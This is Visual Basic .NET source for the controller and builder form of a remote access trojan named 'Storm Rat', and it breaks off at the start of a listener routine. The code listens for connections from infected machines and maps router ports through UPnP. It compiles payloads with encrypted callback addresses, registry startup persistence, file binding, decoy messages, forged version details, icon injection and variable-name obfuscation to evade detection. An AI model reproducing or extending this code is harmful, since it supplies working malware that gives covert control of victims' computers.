Imports System.Net.Sockets
Imports System.Threading
Imports System.Net
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Reflection

Public Class Storm_Rat
    Dim listener As TcpListener
    Dim listenerThread As Thread
    Public port As Integer = 7218
    Public Const key As String = "7P7t7nffv8359r0pMcLGJ8f4La993FlSnwlr59QiI14bY5e4NV"
    Public Const settingsSplit As String = "Nqa7clHl9mDFHACyp7C1H0m2MBZX43jaOmGDxBVQFnWVztSw6U"
    Public Const profileSettingsSplit As String = "Jo0Eo7h9hHUL3210bF4R1ge2XOqguyQXH502cE2k98EIe8QnAG"
    Const newLine As String = "S91V8117s0Lx92iEMtvn269qu82Jz9MGS673mIgGj3xT8aG451"
    Public themeCustomization As String = ""
    Public buttonACustomization As String = ""
    Public buttonBCustomization As String = ""
    Public textColor As Color = Color.White
    Public Db As New DialogBox
    Dim stillWritingBytes As Boolean = False
    Dim upnpEnabled As Boolean = False
    Dim upnpnat As New NATUPNPLib.UPnPNAT
    Dim mappings As NATUPNPLib.IStaticPortMappingCollection = upnpnat.StaticPortMappingCollection
    Dim h As System.Net.IPHostEntry = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName)
    Dim internalip As String = h.AddressList.GetValue(0).ToString
    Declare Function cleanmemory Lib "kernel32.dll" Alias "SetProcessWorkingSetSize" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As UIntPtr, ByVal maximumWorkingSetSize As UIntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Private Sub Storm_Rat_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Control.CheckForIllegalCrossThreadCalls = False
    End Sub

    Private Sub Storm_Rat_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        If File.Exists(Application.StartupPath & "\config.ini") Then
            Try
                Dim config As String = Encryption.XORDecryption(key, File.ReadAllText(Application.StartupPath & "\config.ini"))
                Dim settings() As String = Split(config, "|")
                If CInt(settings(0)) < 65536 And CInt(settings(0)) > 0 Then
                    PortTextBox.Text = CInt(settings(0))
                    PasswordTextBox.Text = settings(1)
                    If settings(2) = "True" Then NotifyCheckBox.Checked = True Else NotifyCheckBox.Checked = False
                    If settings(3) = "True" Then PlaySoundCheckBox.Checked = True Else PlaySoundCheckBox.Checked = False
                    Dim part() As String = Split(settings(4), settingsSplit)
                    For i = 0 To part.Length - 2 Step 4
                        Dim item As New ListViewItem
                        item.Text = part(i)
                        If Not part(i + 1) = "" Then item.Tag = part(i + 1)
                        item.SubItems.Add(part(i + 2))
                        item.SubItems.Add(part(i + 3))
                        item.SubItems.Add(part(i + 4))
                        OnJoinListView.Items.Add(item)
                    Next
                Else
                    File.Delete(Application.StartupPath & "\config.ini")
                End If
            Catch
                PortTextBox.Text = "" : PasswordTextBox.Text = ""
                NotifyCheckBox.Checked = False : PlaySoundCheckBox.Checked = False
                OnJoinListView.Items.Clear()
                File.Delete(Application.StartupPath & "\config.ini")
            End Try
        End If
        Try
            Dim b As New Global.upnp.portmapper
            For Each portmapping As NATUPNPLib.IStaticPortMapping In mappings
                UPnPListView.Items.Add(New ListViewItem({portmapping.Protocol, portmapping.ExternalPort, portmapping.Description}))
            Next
            upnpEnabled = True
        Catch : End Try
        If Not Directory.Exists(Application.StartupPath & "\Profiles\") Then Directory.CreateDirectory(Application.StartupPath & "\Profiles\")
        Dim dir As New System.IO.DirectoryInfo(Application.StartupPath & "\Profiles\")
        For Each f As System.IO.FileInfo In dir.GetFiles("*.srp")
            Dim item As New ListViewItem With {.Text = f.Name.Substring(0, f.Name.LastIndexOf(".")), .ImageIndex = 0}
            If Not item.Text.ToLower = "default" Then ProfileListView.Items.Add(item)
        Next
        ActionComboBox.SelectedIndex = 0 : MessageButtonComboBox.SelectedIndex = 0 : MessageIconComboBox.SelectedIndex = 0 : UPnPProtocolComboBox.SelectedIndex = 0
        ChangeLogTextBox.Text = My.Resources.Updates
    End Sub

    Private Sub Storm_Rat_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If MessageBox.Show("Are you sure to exit?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
            If ListenButton.Text = "Stop Listening" Then ListenStop()
            NotifyIcon.Visible = False
        Else
            e.Cancel = True
        End If
    End Sub

    Private Sub Connections_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Connections.Click
        ConnectionsPanel.BringToFront()
    End Sub

    Private Sub Configuration_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Configuration.Click
        ConfigurationPanel.BringToFront()
    End Sub

    Private Sub Builder_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Builder.Click
        BuilderPanel.BringToFront()
    End Sub

    Private Sub UPnP_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UPnP.Click
        UPnPPanel.BringToFront()
    End Sub

    Private Sub Transfers_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Transfers.Click
        TransfersPanel.BringToFront()
    End Sub

    Private Sub About_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles About.Click
        AboutPanel.BringToFront()
    End Sub

    Private Sub ListenButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListenButton.Click
        Select Case ListenButton.Text
            Case "Start Listening"
                If PortTextBox.Text = "" Then
                    MessageBox.Show("Please enter a port number.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    Exit Sub
                End If
                If CInt(PortTextBox.Text) > 65535 Or CInt(PortTextBox.Text) < 1 Then
                    MessageBox.Show("The port number has to be between 1 and 65535.", "", MessageBoxButtons.OK, MessageBoxIcon.Information) : Exit Sub
                End If
                If PasswordTextBox.Text = "" Then
                    MessageBox.Show("Please input a connection password.", "", MessageBoxButtons.OK, MessageBoxIcon.Information) : Exit Sub
                End If
                Try
                    port = CInt(PortTextBox.Text)
                    listener = New TcpListener(New IPEndPoint(IPAddress.Any, port))
                    listener.Start()
                    listenerThread = New Thread(AddressOf Listen)
                    listenerThread.IsBackground = True : listenerThread.Start()
                    SocketStatus.Text = "Connected" : ConnectedPort.Text = PortTextBox.Text
                    PortTextBox.ReadOnly = True : PasswordTextBox.ReadOnly = True
                    ConnectionList.ContextMenuStrip = FunctionMenuStrip
                    ListenButton.Text = "Stop Listening"
                Catch
                    MessageBox.Show("The port " & PortTextBox.Text & " is currently being used. Please use a different port.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
                End Try
            Case "Stop Listening"
                ListenStop()
        End Select
    End Sub

    Sub ListenStop()
        For Each item As ListViewItem In ConnectionList.Items
            DirectCast(item.Tag, Connection).Leave()
        Next
        listenerThread.Abort() : listener.Stop()
        SocketStatus.Text = "Disconnected" : ConnectedPort.Text = "None"
        PortTextBox.ReadOnly = False : PasswordTextBox.ReadOnly = False
        ConnectionList.ContextMenuStrip = Nothing
        ListenButton.Text = "Start Listening"
    End Sub

    Private Sub NoIPButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NoIPButton.Click
        If No_IP_Updater.CanFocus Then No_IP_Updater.Activate() Else No_IP_Updater.Show()
    End Sub

    Private Sub ThemeButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ThemeButton.Click
        If Theme.CanFocus Then Theme.Activate() Else Theme.Show()
    End Sub

    Private Sub SaveButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SaveButton.Click
        If File.Exists(Application.StartupPath & "\config.ini") Then File.Delete(Application.StartupPath & "\config.ini")
        Dim settings As String = PortTextBox.Text & "|" & PasswordTextBox.Text & "|"
        If NotifyCheckBox.Checked Then settings += "True|" Else settings += "False|"
        If PlaySoundCheckBox.Checked Then settings += "True|" Else settings += "False|"
        Dim onConnectSettings As String = ""
        For Each item As ListViewItem In OnJoinListView.Items
            Select Case item.Text
                Case "Change ID" Or "Visit URL"
                    onConnectSettings &= item.Text & settingsSplit & item.Tag.ToString & settingsSplit & item.SubItems(1).Text & settingsSplit & item.SubItems(2).Text & settingsSplit & item.SubItems(3).Text & settingsSplit
                Case Else
                    onConnectSettings &= item.Text & settingsSplit & settingsSplit & item.SubItems(1).Text & settingsSplit & item.SubItems(2).Text & settingsSplit & item.SubItems(3).Text & settingsSplit
            End Select
        Next
        File.WriteAllText(Application.StartupPath & "\config.ini", Encryption.XOREncryption(key, settings & onConnectSettings))
        MessageBox.Show("The configuration has been saved sucessfully!", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub AddButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AddButton.Click
        Select Case ActionComboBox.SelectedIndex
            Case 0, 7
                If Db.ShowDialog = DialogResult.OK Then OnJoinListView.Items.Add(New ListViewItem({CountryTextBox.Text, IDTextBox.Text, OSTextBox.Text, ActionComboBox.SelectedItem.ToString}) With {.Tag = Db.inputText}) Else Exit Sub
            Case Else
                OnJoinListView.Items.Add(New ListViewItem({CountryTextBox.Text, IDTextBox.Text, OSTextBox.Text, ActionComboBox.SelectedItem.ToString}))
        End Select
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveToolStripMenuItem.Click
        For Each item As ListViewItem In OnJoinListView.SelectedItems
            item.Remove()
        Next
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        For Each item As ListViewItem In ProfileListView.SelectedItems
            If item.Text = "Default" Then
                MessageBox.Show("The default profile cannot be deleted.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Else
                If File.Exists(Application.StartupPath & "\Profiles\" & ProfileListView.FocusedItem.Text & ".srp") Then
                    Try : File.Delete(Application.StartupPath & "\Profiles\" & ProfileListView.FocusedItem.Text & ".srp") : Catch : End Try
                End If
                item.Remove()
            End If
        Next
    End Sub

    Private Sub AddToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AddToolStripMenuItem.Click
        Dim ofd As New OpenFileDialog
        If ofd.ShowDialog = DialogResult.OK Then BinderListView.Items.Add(ofd.FileName)
    End Sub

    Private Sub RemoveToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveToolStripMenuItem1.Click
        For Each item As ListViewItem In BinderListView.Items
            item.Remove()
        Next
    End Sub

    Private Sub RemoveToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveToolStripMenuItem2.Click
        If Not upnpEnabled Then
            MessageBox.Show("UPnP does not seem to be supported on your router.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        Try
            For Each item As ListViewItem In UPnPListView.SelectedItems
                mappings.Remove(item.Text, item.SubItems(1).Text)
            Next
            UPnPListView.Items.Clear()
            For Each portmapping As NATUPNPLib.IStaticPortMapping In mappings
                UPnPListView.Items.Add(New ListViewItem({portmapping.Protocol, portmapping.ExternalPort, portmapping.Description}))
            Next
        Catch : End Try
    End Sub

    Private Sub CancelTransferToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CancelTransferToolStripMenuItem.Click
        For Each item As ListViewItem In TransfersListView.SelectedItems
            Select Case item.SubItems(2).Text
                Case "To Server"
                    If Not DirectCast(item.Tag, FileUpload).id = 0 Then
                        Do Until stillWritingBytes = False
                            Application.DoEvents()
                        Loop
                        DirectCast(item.Tag, FileUpload).id = 0 : DirectCast(item.Tag, FileUpload).canceled = True : DirectCast(item.Tag, FileUpload).nextPart = True
                        item.SubItems(5).Text = "Canceled"
                    End If
                Case "From Server"
                    If Not DirectCast(item.Tag, FileDownload).id = 0 Then
                        Do Until stillWritingBytes = False
                            Application.DoEvents()
                        Loop
                        DirectCast(item.Tag, FileDownload).id = 0 : DirectCast(item.Tag, FileDownload).canceled = True : DirectCast(item.Tag, FileDownload).nextPart = True
                        item.SubItems(5).Text = "Canceled"
                    End If
            End Select
        Next
    End Sub

    Private Sub BuildGeneralButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuildGeneralButton.Click
        BuildGeneralPanel.BringToFront()
    End Sub

    Private Sub BuildMiscellaneousButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuildMiscellaneousButton.Click
        BuildMiscPanel.BringToFront()
    End Sub

    Private Sub BuildAssemblyButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuildAssemblyButton.Click
        BuildAssemblyPanel.BringToFront()
    End Sub

    Private Sub GenerateMutexButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GenerateMutexButton.Click
        Dim TheVariable As String = Nothing
        Dim CharactersToUse As String = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM1234567890"
        For x As Integer = 1 To (New Random).Next(11, 15)
            Dim PickAChar As Integer = Int((CharactersToUse.Length - 2) * Rnd()) + 1
            TheVariable += (CharactersToUse(PickAChar))
        Next
        MutexTextBox.Text = TheVariable
    End Sub

    Private Sub IconButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles IconButton.Click
        Dim ofd As New OpenFileDialog With {.Filter = "Icon Files|*.ico"}
        If ofd.ShowDialog = DialogResult.OK Then
            IconPictureBox.Image = Image.FromFile(ofd.FileName) : IconPictureBox.Tag = ofd.FileName
        End If
    End Sub

    Private Sub BuildButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BuildButton.Click
        If BuilderIPTextBox.Text = "" Or BuilderPortTextBox.Text = "" Or BuilderIDTextBox.Text = "" Or BuilderPasswordTextBox.Text = "" Then
            MessageBox.Show("Please make sure the ip, port, id, and password fields are filled in properly.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        If Not CInt(BuilderPortTextBox.Text) < 65536 Or CInt(BuilderPortTextBox.Text) = 0 Then
            MessageBox.Show("Please make sure your port number is a valid port number.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        If MutexTextBox.Text = "" Then
            MessageBox.Show("The mutex cannot be left empty. Please generate a mutex.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        If InstallServerCheckBox.Checked And BuilderStartupTextBox.Text = "" Then
            MessageBox.Show("Please input a registry startup key.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        Dim sfd As New SaveFileDialog With {.Filter = "Executable Files (*.exe)|*.exe"}
        If Not sfd.ShowDialog = DialogResult.OK Then Exit Sub
        If BuildLogTextBox.Text = "" Then BuildLogTextBox.Text &= "[" & TimeOfDay & "] Building New Server..." & Environment.NewLine Else BuildLogTextBox.Text &= Environment.NewLine & Environment.NewLine & "[" & TimeOfDay & "] Building New Server..." & Environment.NewLine
        If IO.File.Exists(sfd.FileName) Then IO.File.Delete(sfd.FileName)
        Dim mainModuleName As String = RandomVariable(50, 70)
        Dim StormServer As String = RandomVariable(30, 50)
A:
        Dim binderResource As String = RandomVariable(30, 50)
        If binderResource = StormServer Then GoTo A
        Dim archiverResource As String = RandomVariable(30, 50)
B:
        Dim serverResource As String = RandomVariable(30, 50)
        If serverResource = archiverResource Then GoTo B
        Dim encryptionPass As String = RandomVariable(70, 100)
        Using R As New Resources.ResourceWriter(Path.GetTempPath & StormServer & ".resources")
            R.AddResource(archiverResource, My.Resources.Archiver)
            R.AddResource(serverResource, Assembly.Load(My.Resources.Archiver).GetType("Archive.Helper").GetMethod("Compress").Invoke(Nothing, New Object() {My.Resources.StormServer}))
            R.Generate()
        End Using
        Dim C As New CodeDom.Compiler.CompilerParameters
        With C
            If BinderListView.Items.Count > 0 Then
                Using R As New Resources.ResourceWriter(Path.GetTempPath & binderResource & ".resources")
                    For Each item As ListViewItem In BinderListView.Items
                        R.AddResource(System.IO.Path.GetFileName(item.Text), Convert.ToBase64String(IO.File.ReadAllBytes(item.Text)))
                    Next
                End Using
                .EmbeddedResources.Add(Path.GetTempPath & binderResource & ".resources")
                BuildLogTextBox.Text &= "[" & TimeOfDay & "] Binding Files..." & Environment.NewLine
            End If
            .EmbeddedResources.Add(Path.GetTempPath & StormServer & ".resources")
            .WarningLevel = 0
            .GenerateExecutable = True
            .GenerateInMemory = False
            .IncludeDebugInformation = False
            .OutputAssembly = sfd.FileName
            .MainClass = mainModuleName
            .CompilerOptions = "/t:winexe"
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            BuildLogTextBox.Text &= "[" & TimeOfDay & "] Including References..." & Environment.NewLine
        End With
        Dim D As New Dictionary(Of String, String)
        D.Add("CompilerVersion", "v2.0")
        Using T As New VBCodeProvider(D)
            Dim Code As String = My.Resources.Source
            Code = Code.Replace("*Title*", DescriptionTextBox.Text)
            Code = Code.Replace("*Company*", CompanyTextBox.Text)
            Code = Code.Replace("*Product*", ProductTextBox.Text)
            Code = Code.Replace("*Copyright*", CopyrightTextBox.Text)
            Code = Code.Replace("*Trademark*", TrademarkTextBox.Text)
            Code = Code.Replace("*Version*", VersionNumeric1.Value.ToString & "." & VersionNumeric2.Value.ToString & "." & VersionNumeric3.Value.ToString & "." & VersionNumeric4.Value.ToString)
            BuildLogTextBox.Text &= "[" & TimeOfDay & "] Changing Assembly Information..." & Environment.NewLine
            Code = Code.Replace("""127.0.0.1""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, BuilderIPTextBox.Text) & """)")
            Code = Code.Replace("12345", BuilderPortTextBox.Text)
            Code = Code.Replace("""|Identification|""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, BuilderIDTextBox.Text) & """)")
            Code = Code.Replace("""|Pass|""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, BuilderPasswordTextBox.Text) & """)")
            If InstallServerCheckBox.Checked Then Code = Code.Replace("False, ""|MyStartupKey|", "True, ""|MyStartupKey|")
            If RegPersistenceCheckBox.Checked Then Code = Code.Replace("""|MyStartupKey|"", False", """|MyStartupKey|"", True")
            Code = Code.Replace("""|MyStartupKey|""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, BuilderStartupTextBox.Text) & """)")
            Code = Code.Replace("""|MyMutex|""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, MutexTextBox.Text) & """)")
            If ShowMessageCheckBox.Checked Then Code = Code.Replace("Dim q12p As Boolean = False,", "Dim q12p As Boolean = True,")
            Code = Code.Replace("""|MessageBoxText|""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, MessageTextTextBox.Text) & """)")
            Code = Code.Replace("""|MessageBoxTitle|""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, MessageTitleTextBox.Text) & """)")
            Select Case MessageButtonComboBox.SelectedIndex
                Case 0
                    Code = Code.Replace("MessageBoxButtons.OK,", "MessageBoxButtons.YesNo,")
                Case 1
                    Code = Code.Replace("MessageBoxButtons.OK,", "MessageBoxButtons.YesNoCancel,")
                Case 3
                    Code = Code.Replace("MessageBoxButtons.OK,", "MessageBoxButtons.OKCancel,")
                Case 4
                    Code = Code.Replace("MessageBoxButtons.OK,", "MessageBoxButtons.RetryCancel,")
                Case 5
                    Code = Code.Replace("MessageBoxButtons.OK,", "MessageBoxButtons.AbortRetryIgnore,")
            End Select
            Select Case MessageIconComboBox.SelectedIndex
                Case 1
                    Code = Code.Replace("MessageBoxIcon.Information,", "MessageBoxIcon.Question)")
                Case 2
                    Code = Code.Replace("MessageBoxIcon.Information,", "MessageBoxIcon.Warning)")
                Case 3
                    Code = Code.Replace("MessageBoxIcon.Information,", "MessageBoxIcon.Error)")
            End Select
            If BuildMeltCheckBox.Checked Then Code = Code.Replace("q14p As Boolean = False", "q14p As Boolean = True")
            If BinderListView.Items.Count > 0 Then Code = Code.Replace("q13p As Boolean = False,", "q13p As Boolean = True,")
            Code = Code.Replace("""|MyResourceFileName|""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, binderResource) & """)")
            Code = Code.Replace("""|StormServer|""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, StormServer) & """)")
            Code = Code.Replace("""|ArchiverResource|""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, archiverResource) & """)")
            Code = Code.Replace("""|ServerResource|""", "q5p(""" & encryptionPass & """, """ & Encryption.XOREncryption(encryptionPass, serverResource) & """)")
            Code = Code.Replace("Module1", mainModuleName)
            For i = 1 To 20
                Code = Code.Replace("q" & i.ToString & "p", RandomVariable(50, 70))
            Next
            BuildLogTextBox.Text &= "[" & TimeOfDay & "] Renaming Variables..." & Environment.NewLine
            Dim cResults = T.CompileAssemblyFromSource(C, Code)
            If cResults.Errors.Count > 0 Then
                For Each CompilerError In cResults.Errors
                    MessageBox.Show("Error: " & CompilerError.ErrorText, "", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Next
                My.Computer.Clipboard.SetText(Code)
                Exit Sub
            End If
        End Using
        If Not IconPictureBox.Image Is Nothing Then IconInjector.InjectIcon(sfd.FileName, DirectCast(IconPictureBox.Tag, String)) : BuildLogTextBox.Text &= "[" & TimeOfDay & "] Chainging Icon..." & Environment.NewLine
        If IO.File.Exists(Path.GetTempPath & binderResource & ".resources") Then IO.File.Delete(Path.GetTempPath & ".resources")
        If IO.File.Exists(Path.GetTempPath & StormServer & ".resources") Then IO.File.Delete(Path.GetTempPath & StormServer & ".resources")
        BuildLogTextBox.Text &= "[" & TimeOfDay & "] Obfuscating Assembly..." & Environment.NewLine
        Dim writer As New FileStream(sfd.FileName, FileMode.Open, FileAccess.Write)
        writer.Seek(244, SeekOrigin.Begin) : writer.WriteByte(11)
        writer.Flush() : writer.Close()
        BuildLogTextBox.Text &= "[" & TimeOfDay & "] Server Successfully Compiled."
        If MessageBox.Show("The server has been created successfully. Would you like to save the current settings?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
            If Db.ShowDialog = DialogResult.OK Then
                Try
                    If Db.inputText.tolower = "default" Then Exit Sub
                    If Not Directory.Exists(Application.StartupPath & "\Profiles\") Then Directory.CreateDirectory(Application.StartupPath & "\Profiles\")
                    If File.Exists(Application.StartupPath & "\Profiles\" & Db.inputText & ".srp") Then File.Delete(Application.StartupPath & "\Profiles\" & Db.inputText & ".srp")
                    Dim settings As String = ""
                    settings &= BuilderIPTextBox.Text & profileSettingsSplit & BuilderPortTextBox.Text & profileSettingsSplit & BuilderIDTextBox.Text & profileSettingsSplit & BuilderPasswordTextBox.Text & profileSettingsSplit
                    If ShowMessageCheckBox.Checked Then settings &= "True" & profileSettingsSplit Else settings &= "False" & profileSettingsSplit
                    settings &= MessageIconComboBox.SelectedIndex.ToString & profileSettingsSplit & MessageButtonComboBox.SelectedIndex.ToString & profileSettingsSplit & MessageTitleTextBox.Text & profileSettingsSplit & MessageTextTextBox.Text & profileSettingsSplit
                    If InstallServerCheckBox.Checked Then settings &= "True" & profileSettingsSplit Else settings &= "False" & profileSettingsSplit
                    settings &= BuilderStartupTextBox.Text & profileSettingsSplit & MutexTextBox.Text & profileSettingsSplit
                    If BuildMeltCheckBox.Checked Then settings &= "True" & profileSettingsSplit Else settings &= "False" & profileSettingsSplit
                    If RegPersistenceCheckBox.Checked Then settings &= "True" & profileSettingsSplit Else settings &= "False" & profileSettingsSplit
                    settings &= DirectCast(IconPictureBox.Tag, String) & profileSettingsSplit
                    For Each item As ListViewItem In BinderListView.Items
                        settings &= item.Text & "|"
                    Next
                    settings &= profileSettingsSplit & DescriptionTextBox.Text & profileSettingsSplit & CompanyTextBox.Text & profileSettingsSplit & ProductTextBox.Text & profileSettingsSplit & CopyrightTextBox.Text & profileSettingsSplit & TrademarkTextBox.Text & profileSettingsSplit
                    settings &= VersionNumeric1.Value.ToString & profileSettingsSplit & VersionNumeric2.Value.ToString & profileSettingsSplit & VersionNumeric3.Value.ToString & profileSettingsSplit & VersionNumeric4.Value.ToString
                    IO.File.WriteAllText(Application.StartupPath & "\Profiles\" & Db.inputText & ".srp", Encryption.XOREncryption(key, settings))
                    ProfileListView.Items.Add(New ListViewItem({Db.inputText}) With {.ImageIndex = 0})
                Catch
                    MessageBox.Show("An error occurred and the settings could not be saved. Please try again.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
                End Try
            End If
        End If
    End Sub

    Private Sub UPnPAddButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UPnPAddButton.Click
        If Not upnpEnabled Then
            MessageBox.Show("UPnP does not seem to be supported on your router.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        If UPnPPortTextBox.Text = "" Then
            MessageBox.Show("Please make sure all fields are filled in properly.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        Try
            mappings.Add(UPnPPortTextBox.Text, UPnPProtocolComboBox.SelectedItem.Text, UPnPPortTextBox.Text, internalip, True, UPnPDescriptionTextBox.Text)
            UPnPListView.Items.Clear()
            For Each portmapping As NATUPNPLib.IStaticPortMapping In mappings
                UPnPListView.Items.Add(New ListViewItem({portmapping.Protocol, portmapping.ExternalPort, portmapping.Description}))
            Next
        Catch : End Try
    End Sub

    Private Sub BuilderPortTextBox_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles BuilderPortTextBox.KeyPress
        If Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar) Then e.Handled = True
    End Sub

    Private Sub UPnPPortTextBox_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles UPnPPortTextBox.KeyPress
        If Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar) Then e.Handled = True
    End Sub

    Private Sub PortTextBox_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles PortTextBox.KeyPress
        If Not Char.IsNumber(e.KeyChar) And Not Char.IsControl(e.KeyChar) Then e.Handled = True
    End Sub

    Private Sub ProfileListView_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ProfileListView.DoubleClick
        If ProfileListView.FocusedItem.Index = 0 Then
            BuilderIPTextBox.Text = "" : BuilderPortTextBox.Text = "" : BuilderIDTextBox.Text = "" : BuilderPasswordTextBox.Text = ""
            ShowMessageCheckBox.Checked = False : MessageIconComboBox.SelectedIndex = 0 : MessageButtonComboBox.SelectedIndex = 0
            MessageTitleTextBox.Text = "" : MessageTextTextBox.Text = "" : InstallServerCheckBox.Checked = False : BuilderStartupTextBox.Text = "" : MutexTextBox.Text = ""
            BuildMeltCheckBox.Checked = False : RegPersistenceCheckBox.Checked = False : IconPictureBox.Image = Nothing : IconPictureBox.Tag = Nothing : BinderListView.Items.Clear()
            DescriptionTextBox.Text = "" : CompanyTextBox.Text = "" : ProductTextBox.Text = "" : CopyrightTextBox.Text = "" : TrademarkTextBox.Text = ""
            VersionNumeric1.Value = 0 : VersionNumeric2.Value = 0 : VersionNumeric3.Value = 0 : VersionNumeric4.Value = 0 : BuildLogTextBox.Text = ""
        Else
            Try
                Dim settings() As String = Split(Encryption.XORDecryption(key, IO.File.ReadAllText(Application.StartupPath & "\Profiles\" & ProfileListView.FocusedItem.Text & ".srp")), profileSettingsSplit)
                Dim tempInt As Integer = CInt(settings(24)) : tempInt = CInt(settings(23)) : tempInt = CInt(settings(22)) : tempInt = CInt(settings(21)) : tempInt = CInt(settings(6)) : tempInt = CInt(settings(5)) : tempInt = CInt(settings(1))
                If Not settings(14) = "" Then Dim tempImage As Image = Image.FromFile(settings(14))
                BuilderIPTextBox.Text = settings(0) : BuilderPortTextBox.Text = settings(1) : BuilderIDTextBox.Text = settings(2) : BuilderPasswordTextBox.Text = settings(3)
                If settings(4) = "True" Then ShowMessageCheckBox.Checked = True Else ShowMessageCheckBox.Checked = False
                MessageIconComboBox.SelectedIndex = CInt(settings(5)) : MessageButtonComboBox.SelectedIndex = CInt(settings(6))
                MessageTitleTextBox.Text = settings(7) : MessageTextTextBox.Text = settings(8)
                If settings(9) = "True" Then InstallServerCheckBox.Checked = True Else InstallServerCheckBox.Checked = False
                BuilderStartupTextBox.Text = settings(10) : MutexTextBox.Text = settings(11)
                If settings(12) = "True" Then BuildMeltCheckBox.Checked = True Else BuildMeltCheckBox.Checked = False
                If settings(13) = "True" Then RegPersistenceCheckBox.Checked = True Else RegPersistenceCheckBox.Checked = False
                If Not settings(14) = "" Then
                    IconPictureBox.Image = Image.FromFile(settings(14)) : IconPictureBox.Tag = settings(14)
                End If
                BinderListView.Items.Clear()
                If Not settings(15) = "" Then
                    Dim bindFiles() As String = Split(settings(15), "|")
                    For Each s As String In bindFiles
                        If Not s = "" Then BinderListView.Items.Add(s)
                    Next
                End If
                DescriptionTextBox.Text = settings(16) : CompanyTextBox.Text = settings(17) : ProductTextBox.Text = settings(18) : CopyrightTextBox.Text = settings(19) : TrademarkTextBox.Text = settings(20)
                VersionNumeric1.Value = CInt(settings(21)) : VersionNumeric2.Value = CInt(settings(22)) : VersionNumeric3.Value = CInt(settings(23)) : VersionNumeric4.Value = CInt(settings(24))
            Catch
                MessageBox.Show("The selected profile is not valid. It will now be deleted.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            End Try
        End If
    End Sub

    Private Sub BuildLogTextBox_TextChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles BuildLogTextBox.TextChanged
        BuildLogTextBox.SelectionStart = BuildLogTextBox.TextLength : BuildLogTextBox.ScrollToCaret()
    End Sub

    Sub Listen()
